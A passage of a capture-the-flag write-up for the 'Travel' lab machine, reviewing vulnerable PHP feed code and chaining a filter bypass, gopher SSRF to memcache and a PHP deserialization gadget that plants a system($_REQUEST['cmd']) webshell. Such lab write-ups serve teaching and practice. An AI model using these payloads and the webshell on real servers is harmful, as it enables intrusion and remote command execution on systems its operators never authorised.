+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         $simplepie-&gt;set_cache_location(&#39;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#39;);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         //$simplepie-&gt;set_raw_data($data);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         $simplepie-&gt;set_feed_url($url);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         $simplepie-&gt;init();
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         $simplepie-&gt;handle_content_type();
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         if ($simplepie-&gt;error) {
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>             error_log($simplepie-&gt;error);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>             $simplepie = null;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>             $failed = True;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         }
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>     } else {
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         $failed = True;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>     }
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>     return $simplepie;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010> 	 }
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010> 	$url = $_SERVER[&#39;QUERY_STRING&#39;];
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	if(strpos($url, &#34;custom_feed_url&#34;) !== false){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		$tmp = (explode(&#34;=&#34;, $url));
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		$url = end($tmp);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010> 	 } else {
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010> 	 	$url = &#34;http://www.travel.htb/newsfeed/customfeed.xml&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010> 	 }
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010> 	 $feed = get_feed($url);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>     if ($feed-&gt;error())
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		{
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			echo &#39;&lt;div class=&#34;sp_errors&#34;&gt;&#39; . &#34;\r\n&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			echo &#39;&lt;p&gt;&#39; . htmlspecialchars($feed-&gt;error()) . &#34;&lt;/p&gt;\r\n&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			echo &#39;&lt;/div&gt;&#39; . &#34;\r\n&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		else {
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	&lt;div class=&#34;chunk focus&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		&lt;h3 class=&#34;header&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		&lt;?php
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			$link = $feed-&gt;get_link();
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			$title = $feed-&gt;get_title();
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			if ($link)
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			{
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				$title = &#34;&lt;a href=&#39;$link&#39; title=&#39;$title&#39;&gt;$title&lt;/a&gt;&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			echo $title;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		&lt;/h3&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		&lt;?php echo $feed-&gt;get_description(); ?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	&lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	&lt;?php foreach($feed-&gt;get_items() as $item): ?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		&lt;div class=&#34;chunk&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			&lt;h4&gt;&lt;?php if ($item-&gt;get_permalink()) echo &#39;&lt;a href=&#34;&#39; . $item-&gt;get_permalink() . &#39;&#34;&gt;&#39;; echo $item-&gt;get_title(); if ($item-&gt;get_permalink()) echo &#39;&lt;/a&gt;&#39;; ?&gt;&amp;nbsp;&lt;span class=&#34;footnote&#34;&gt;&lt;?php echo $item-&gt;get_date(&#39;j M Y, g:i a&#39;); ?&gt;&lt;/span&gt;&lt;/h4&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			&lt;?php echo $item-&gt;get_content(); ?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			&lt;?php
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			if ($enclosure = $item-&gt;get_enclosure(0))
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			{
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				echo &#39;&lt;div align=&#34;center&#34;&gt;&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				echo &#39;&lt;p&gt;&#39; . $enclosure-&gt;embed(array(
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>					&#39;audio&#39; =&gt; &#39;./for_the_demo/place_audio.png&#39;,
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>					&#39;video&#39; =&gt; &#39;./for_the_demo/place_video.png&#39;,
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>					&#39;mediaplayer&#39; =&gt; &#39;./for_the_demo/mediaplayer.swf&#39;,
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>					&#39;altclass&#39; =&gt; &#39;download&#39;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				)) . &#39;&lt;/p&gt;&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				if ($enclosure-&gt;get_link() &amp;&amp; $enclosure-&gt;get_type())
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				{
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>					echo &#39;&lt;p class=&#34;footnote&#34; align=&#34;center&#34;&gt;(&#39; . $enclosure-&gt;get_type();
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>					if ($enclosure-&gt;get_size())
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>					{
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>						echo &#39;; &#39; . $enclosure-&gt;get_size() . &#39; MB&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>					}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>					echo &#39;)&lt;/p&gt;&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				if ($enclosure-&gt;get_thumbnail())
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				{
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>					echo &#39;&lt;div&gt;&lt;img src=&#34;&#39; . $enclosure-&gt;get_thumbnail() . &#39;&#34; alt=&#34;&#34; /&gt;&lt;/div&gt;&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				echo &#39;&lt;/div&gt;&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		&lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	&lt;?php endforeach; ?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;?php } ?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/main&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;!--
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>DEBUG
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;?php
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>if (isset($_GET[&#39;debug&#39;])){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  include(&#39;debug.php&#39;);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>--&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;?php get_template_part( &#39;template-parts/footer-menus-widgets&#39; ); ?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;?php
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>get_footer();
+</span></span></span></code></pre></div><p>Lines 33, 34, 40 seems to show a user controlled input. Lines 103, 104 teels use we can enable
+a debug feature that may be show more verbose messages. On line 5, <code>template.php</code> is included
+so let&rsquo;s take a look at it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>/**
+</span></span></span><span style=display:flex><span><span style=color:#e6db74> Todo: finish logging implementation via TemplateHelper
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>safe</span>($url)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// this should be secure
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	$tmpUrl <span style=color:#f92672>=</span> <span style=color:#a6e22e>urldecode</span>($url);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strpos</span>($tmpUrl, <span style=color:#e6db74>&#34;file://&#34;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span> <span style=color:#66d9ef>or</span> <span style=color:#a6e22e>strpos</span>($tmpUrl, <span style=color:#e6db74>&#34;@&#34;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strpos</span>($tmpUrl, <span style=color:#e6db74>&#34;-o&#34;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span> <span style=color:#66d9ef>or</span> <span style=color:#a6e22e>strpos</span>($tmpUrl, <span style=color:#e6db74>&#34;-F&#34;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	$tmp <span style=color:#f92672>=</span> <span style=color:#a6e22e>parse_url</span>($url, <span style=color:#a6e22e>PHP_URL_HOST</span>);
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// preventing all localhost access
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span>($tmp <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;localhost&#34;</span> <span style=color:#66d9ef>or</span> $tmp <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> $url;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>url_get_contents</span> ($url) {
+</span></span><span style=display:flex><span>    $url <span style=color:#f92672>=</span> <span style=color:#a6e22e>safe</span>($url);
+</span></span><span style=display:flex><span>	$url <span style=color:#f92672>=</span> <span style=color:#a6e22e>escapeshellarg</span>($url);
+</span></span><span style=display:flex><span>	$pl <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;curl &#34;</span><span style=color:#f92672>.</span>$url;
+</span></span><span style=display:flex><span>	$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>shell_exec</span>($pl);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $output;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>TemplateHelper</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $file;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $data;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>(<span style=color:#a6e22e>string</span> $file, <span style=color:#a6e22e>string</span> $data)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>    	$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>init</span>($file, $data);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>()
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>    	$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>init</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>init</span>(<span style=color:#a6e22e>string</span> $file, <span style=color:#a6e22e>string</span> $data)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span> <span style=color:#f92672>=</span> $file;
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> $data;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>file_put_contents</span>(<span style=color:#66d9ef>__DIR__</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/logs/&#39;</span><span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>What we saw in <code>rss_template.php</code>:</p><ol><li>L40 <code>get_feed()</code> is called with <code>$url</code> as arg</li><li>L33 <code>$url</code> is user controlled via <code>custom_feed_url</code> in the URL</li><li>L14 In <code>get_feed()</code> the function <code>url_get_contents()</code> is called</li></ol><p><code>url_get_contents()</code> is a custom function that reminds us the official
+<a href=https://www.php.net/manual/en/function.file-get-contents>file_get_contents</a> function.</p><p>Now what we can see in <code>template.php</code>:</p><ol><li>L28-34 <code>url_get_contents()</code> is defined</li></ol><ul><li>L29 the <code>safe()</code> custom function is called</li><li>L30 the <code>escapeshellarg()</code> native function is called (see <a href=https://www.php.net/manual/en/function.escapeshellarg>the doc</a>)</li><li>L31-32 <code>curl</code> is called inside <code>shell_exec()</code> with user controlled argument</li><li>This gives potential for local file disclosure, SSRF and RCE. Maybe even XXE if SimplePie parser is vulnerable.</li></ul><ol start=2><li>L7-26 the <code>safe()</code> function seems to some basic filtering that is bypassable</li></ol><p>The feed seems available for display at those endpoints:</p><ul><li>(raw) <a href=http://www.travel.htb/newsfeed/customfeed.xml>http://www.travel.htb/newsfeed/customfeed.xml</a></li><li>(parsed) <a href=http://blog.travel.htb/awesome-rss/>http://blog.travel.htb/awesome-rss/</a></li></ul><p>However the feed <a href=http://blog.travel.htb/feed/>http://blog.travel.htb/feed/</a> we saw earlier seems to be completely
+different and won&rsquo;t interest us.</p><p>It seems that <a href=http://blog.travel.htb/awesome-rss/>http://blog.travel.htb/awesome-rss/</a> is using <code>rss_template.php</code>
+to parse <a href=http://www.travel.htb/newsfeed/customfeed.xml>http://www.travel.htb/newsfeed/customfeed.xml</a> and render it in HTML.</p><p>We can alter this behavior by providing another feed source with the parameter
+<code>custom_feed_url</code>. For example we can provide this alternative RSS
+source: <a href="http://blog.travel.htb/awesome-rss/?custom_feed_url=http://blog.travel.htb/feed/">http://blog.travel.htb/awesome-rss/?custom_feed_url=http://blog.travel.htb/feed/</a>.</p><p>The <code>safe()</code> function disable us to use <code>file://</code> protocol but <code>gopher://</code> may
+be use instead. <code>127.0.0.1</code> and <code>localhost</code> are filtered but that&rsquo;s easily
+bypassable.</p><p>L17 we also saw there was a memcache server. <code>gopher://</code> will allow us to interact
+with memcache so it seems the way to go.</p><p>Let&rsquo;s see if we can craft a gopher payload that bypass the filters
+to check if we can use gopher.</p><p>Let&rsquo;s quickly check that the string comparison is case sensitive in PHP.
+Hopefully URL are case insensitive so <code>LOCALHOST</code> will be accepted by the server
+and not filtered by <code>safe()</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>php</span> <span style=color:#f92672>-</span><span style=color:#a6e22e>a</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Interactive</span> <span style=color:#a6e22e>shell</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>php</span> <span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>var_dump</span>(<span style=color:#e6db74>&#34;LOCALHOST&#34;</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;localhost&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>bool</span>(<span style=color:#66d9ef>false</span>)
+</span></span></code></pre></div><p>Requesting on port 80 we can access the local HTTP server and bypass <code>safe()</code>.</p><pre tabindex=0><code>http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://LOCALHOST:80/
+</code></pre><p>Other localhost bypasses may be found on <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#payloads-with-localhost>PayloadsAllTheThings</a>.</p><p>If one didn&rsquo;t see the memcache URL it&rsquo;s still possible to bruteforce ports
+to check available services on localhost.</p><p>To create gopher payloads there is no better tool than <a href=https://github.com/tarunkant/Gopherus>Gopherus</a>.</p><pre tabindex=0><code>$ gopherus --exploit dmpmemcache
+$ gopherus --exploit phpmemcache
+</code></pre><p>With the first command we will be able to dump the Memcached content and with
+the second one to execute a PHP payload.</p><p>Let&rsquo;s try some basic memcache commands found on <a href=https://book.hacktricks.xyz/pentesting/11211-memcache#protocol-information>HackTricks</a>.</p><pre tabindex=0><code>$ gopherus --exploit dmpmemcache
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
+        \/       |__|        \/     \/                 \/
+
+                author: $_SpyD3r_$
+
+Give payload you want to run in Memcached Server: version
+
+Your gopher link is ready to dump Memcache :
+
+gopher://127.0.0.1:11211/_%0d%0aversion%0d%0a
+
+-----------Made-by-SpyD3r----------
+</code></pre><p>Then we just have to replace <code>127.0.0.1</code> by <code>LOCALHOST</code>:</p><pre tabindex=0><code>?custom_feed_url=gopher://LOCALHOST:11211/_%0d%0aversion%0d%0a
+</code></pre><p>This is maybe working but I don&rsquo;t think we will obtain an output so let&rsquo;s try
+a RCE directly.</p><p>To get a RCE we have to know a Class where we can use deserialization,
+hopefully there is <code>TemplateHelper</code> class in <code>template.php</code>.</p><p>Let&rsquo;s create a PoC for serialization:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>TemplateHelper</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $file;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $data;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>(<span style=color:#a6e22e>string</span> $file, <span style=color:#a6e22e>string</span> $data)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>    	$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>init</span>($file, $data);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>()
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>    	$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>init</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>init</span>(<span style=color:#a6e22e>string</span> $file, <span style=color:#a6e22e>string</span> $data)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span> <span style=color:#f92672>=</span> $file;
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> $data;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>file_put_contents</span>(<span style=color:#66d9ef>__DIR__</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/logs/&#39;</span><span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$obj <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>TemplateHelper</span>(<span style=color:#e6db74>&#34;cyfun.php&#34;</span>,<span style=color:#a6e22e>file_get_contents</span>(<span style=color:#e6db74>&#39;shell.php&#39;</span>));
+</span></span><span style=display:flex><span>$serialized <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>($obj);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $serialized;
+</span></span></code></pre></div><p>With the class we will be able to write a file into the log folder.
+I wanted to write a php webshell with <a href=https://github.com/epinna/weevely3>weevely</a> but <a href=https://github.com/epinna/weevely3>weevely</a> generated shell
+contains a lot of <code>@</code> chars that are disabled. So I had to use a simpler
+webshell, something like <a href=https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985>easy-simple-php-webshell.php</a>
+or <a href=https://gist.github.com/sente/4dbb2b7bdda2647ba80b>Simple-Backdoor-One-Liner.php</a>.</p><p>Then we can serialize it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#a6e22e>php</span> <span style=color:#a6e22e>serialize</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>&gt;/</span><span style=color:#a6e22e>dev</span><span style=color:#f92672>/</span><span style=color:#66d9ef>null</span> <span style=color:#f92672>|</span> <span style=color:#a6e22e>tr</span> <span style=color:#f92672>-</span><span style=color:#a6e22e>d</span> <span style=color:#e6db74>&#39;\n&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>O</span><span style=color:#f92672>:</span><span style=color:#ae81ff>14</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;TemplateHelper&#34;</span><span style=color:#f92672>:</span><span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>{<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>20</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;TemplateHelperfile&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>9</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;cyfun.php&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>20</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;TemplateHelperdata&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>113</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;&lt;?php if(isset(</span><span style=color:#e6db74>$_REQUEST[&#39;cmd&#39;]</span><span style=color:#e6db74>)){ echo &#34;</span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>pre</span><span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#34;; </span><span style=color:#e6db74>$cmd</span><span style=color:#e6db74> = (</span><span style=color:#e6db74>$_REQUEST[&#39;cmd&#39;]</span><span style=color:#e6db74>); system(</span><span style=color:#e6db74>$cmd</span><span style=color:#e6db74>); echo &#34;</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>pre</span><span style=color:#f92672>&gt;</span><span style=color:#e6db74>&#34;; die; }?&gt;&#34;</span>;}
